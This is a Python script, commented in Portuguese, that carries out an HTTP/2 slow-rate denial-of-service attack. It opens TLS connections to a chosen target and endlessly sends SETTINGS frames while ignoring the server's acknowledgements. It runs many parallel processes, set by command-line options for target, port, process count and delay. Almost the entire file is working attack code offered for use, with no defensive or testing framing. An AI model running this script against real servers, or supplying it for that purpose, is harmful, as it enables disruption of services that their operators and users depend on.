#!/usr/bin/python3
"""
HTTP/2 Slow Rate SETTINGS Frame Attack Script
Este script inicia múltiplos processos para realizar um ataque de Negação de Serviço (DoS) enviando frames SETTINGS 
incompletos e sem reconhecimento, causando uso de recursos no servidor que aguarda o reconhecimento.

Uso:
    python slowrateDoSattackSETTINGS.py --target <hostname> --port <port> --process <number_of_processes> --delay <delay_time>

Argumentos:
    -t, --target   : Hostname ou endereço IP alvo (obrigatório)
    -p, --port     : Porta do alvo (padrão: 443)
    -P, --process  : Número de processos de ataque a serem iniciados (padrão: 1)
    -d, --delay    : Intervalo entre o início de cada processo em segundos (padrão: 0.1)
"""

import socket
import ssl
import h2.connection
import h2.events
import argparse
import time
from multiprocessing import Process

def establish_tls_connection(host, port):
    """
    Estabelece uma conexão SSL/TLS com o servidor alvo.
    Esta conexão suporta o protocolo HTTP/2.
    """
    try:
        context = ssl.create_default_context()
        context.set_alpn_protocols(['h2'])  # Especifica HTTP/2 como o protocolo desejado
        sock = socket.create_connection((host, port))
        tls_sock = context.wrap_socket(sock, server_hostname=host)
        return tls_sock
    except Exception as e:
        print(f"Erro ao estabelecer conexão TLS: {e}")
        exit(1)

def send_slow_settings(tls_sock, target):
    """
    Envia repetidamente frames SETTINGS para o servidor, sem confirmar o reconhecimento.
    """
    try:
        # Inicializa a conexão HTTP/2
        conn = h2.connection.H2Connection()
        conn.initiate_connection()
        tls_sock.sendall(conn.data_to_send())

        # Envio inicial do frame SETTINGS do cliente
        conn.update_settings({})  # SETTINGS sem configurações
        tls_sock.sendall(conn.data_to_send())
        
        print(f"Frame SETTINGS inicial enviado. Servidor aguardando reconhecimento...")

        # Loop para enviar SETTINGS repetidamente sem reconhecer o frame SETTINGS do servidor
        while True:
            # Recebe dados do servidor
            data = tls_sock.recv(65535)
            if data:
                events = conn.receive_data(data)
                for event in events:
                    # Recebe o frame SETTINGS do servidor e ignora o reconhecimento
                    if isinstance(event, h2.events.SettingsAcknowledged):
                        print(f"Servidor enviou frame SETTINGS. Ignorando reconhecimento...")

            # Envia outro frame SETTINGS do cliente para manter a conexão ativa
            conn.update_settings({})
            tls_sock.sendall(conn.data_to_send())
            time.sleep(1)  # Intervalo para manter a conexão lenta

    except Exception as e:
        print(f"Erro durante o ataque: {e}")
    finally:
        tls_sock.close()

def main():
    """
    Função principal para executar o ataque de Slow Rate SETTINGS.
    """
    # Estabelece a conexão segura TLS
    tls_sock = establish_tls_connection(args.target, args.port)
    
    # Envia o ataque de slow settings
    send_slow_settings(tls_sock, args.target)

if __name__ == "__main__":
    # Análise dos argumentos de linha de comando
    parser = argparse.ArgumentParser(description="Realiza um ataque de Slow Rate usando frames SETTINGS no HTTP/2.")
    parser.add_argument('-t', '--target', type=str, required=True, help="Hostname ou endereço IP alvo.")
    parser.add_argument('-p', '--port', type=int, default=443, help="Porta do alvo (padrão: 443).")
    parser.add_argument('-P', '--process', type=int, default=1, help="Número de processos a serem iniciados (padrão: 1).")
    parser.add_argument('-d', '--delay', type=float, default=0.1, help="Intervalo entre processos em segundos (padrão: 0.1).")

    args = parser.parse_args()

    # Lista para manter os objetos de processos
    process_list = []

    # Inicia o número especificado de processos
    for i in range(args.process):
        # Cria um novo processo para a função principal de ataque
        process = Process(target=main, daemon=True)
        process_list.append(process)
        process.start()

        # Intervalo entre processos para controlar a carga no servidor
        time.sleep(args.delay)

    # Aguarda a conclusão dos processos
    for process in process_list:
        if process.is_alive():
            process.join()

